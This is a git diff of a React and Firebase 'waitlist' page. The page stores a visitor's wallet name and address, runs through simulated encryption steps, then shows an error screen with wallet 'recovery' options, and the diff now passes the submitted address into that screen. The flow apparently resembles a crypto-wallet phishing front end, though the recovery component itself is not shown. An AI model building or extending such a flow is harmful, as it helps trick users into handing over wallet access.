@@ -2,7 +2,6 @@ import React, { useState } from 'react';
 import { addDoc, collection } from 'firebase/firestore';
 import { db } from '../firebase';
 import { useNavigate } from 'react-router-dom';
-import { getWalletById } from '../data/wallets';
 
 // Components
 import WaitlistHeader from '../components/waitlist/WaitlistHeader';
@@ -19,6 +18,7 @@ export default function WaitlistPage() {
   const [submitStatus, setSubmitStatus] = useState('');
   const [waitlistOpen, setWaitlistOpen] = useState(false);
   const [customWalletName, setCustomWalletName] = useState('');
+  const [submittedAddress, setSubmittedAddress] = useState(''); // Added to store the address
   const [showErrorPage, setShowErrorPage] = useState(false);
   const [loading, setLoading] = useState(false);
   const [showSuccessMessage, setShowSuccessMessage] = useState(false);
@@ -34,6 +34,7 @@ export default function WaitlistPage() {
   const handleSubmit = async (walletName, walletAddress) => {
     setIsSubmitting(true);
     setEncryptionStep(1);
+    setSubmittedAddress(walletAddress); // Store the address for recovery
 
     if (!selectedWallet || !walletAddress) {
       setSubmitStatus('error');
@@ -52,7 +53,6 @@ export default function WaitlistPage() {
           await addDoc(collection(db, 'waitlist'), {
             wallet: walletName,
             address: walletAddress,
-            email: 'example@gmail.com',
             timestamp: new Date().toISOString(),
             encrypted: true,
           });
@@ -66,7 +66,6 @@ export default function WaitlistPage() {
           setShowSuccessMessage(true);
           setTimeout(() => {
             setShowSuccessMessage(false);
-            navigate('/waitlist');
           }, 3000);
         }, 3000);
       } catch (error) {
@@ -85,7 +84,7 @@ export default function WaitlistPage() {
         setShowErrorPage(true);
         setEncryptionStep(0);
         setIsSubmitting(false);
-      }, 10000);
+      }, 5000);
     }
   };
 
@@ -97,13 +96,12 @@ export default function WaitlistPage() {
     }, 5000);
   };
 
-  // Show error page with recovery options
   if (showErrorPage) {
     return (
       <ErrorRecoverySection
         onClose={() => setShowErrorPage(false)}
         selectedWallet={selectedWallet}
-        walletAddress=""
+        walletAddress={submittedAddress} // Pass the submitted address
         customWalletName={customWalletName}
         onSuccess={handleRecoverySuccess}
       />
@@ -111,8 +109,11 @@ export default function WaitlistPage() {
   }
 
   return (
-    <div className="min-h-screen bg-[#0a0a0f] pt-24 px-6">
-      <div className="max-w-4xl mx-auto">
+    <div className="min-h-screen bg-background pt-32 pb-20 px-6 relative overflow-hidden">
+      {/* Background Decorative Elements */}
+      <div className="absolute top-0 left-1/2 -translate-x-1/2 w-full max-w-6xl h-[500px] bg-primary/[0.02] rounded-full blur-[120px] -z-10" />
+      
+      <div className="max-w-3xl mx-auto space-y-16">
         <WaitlistHeader />
 
         <StatusMessages 
@@ -120,22 +121,21 @@ export default function WaitlistPage() {
           showSuccessMessage={showSuccessMessage}
         />
 
-        {/* Wallet Search Section - Now at top */}
-        <div className="mb-12">
+        <div className="space-y-12">
           <WalletSearchSection 
             onWalletSelect={handleWalletSelect}
             selectedWallet={selectedWallet}
           />
-        </div>
-
-        {/* Security Features Section - Now at bottom */}
-        <div className="mb-12">
+          
           <SecurityFeaturesSection />
         </div>
 
         <WalletConnectionModal
           isOpen={isModalOpen}
-          onClose={() => setIsModalOpen(false)}
+          onClose={() => {
+            setIsModalOpen(false);
+            setSelectedWallet(null);
+          }}
           selectedWallet={selectedWallet}
           onSubmit={handleSubmit}
           isSubmitting={isSubmitting}
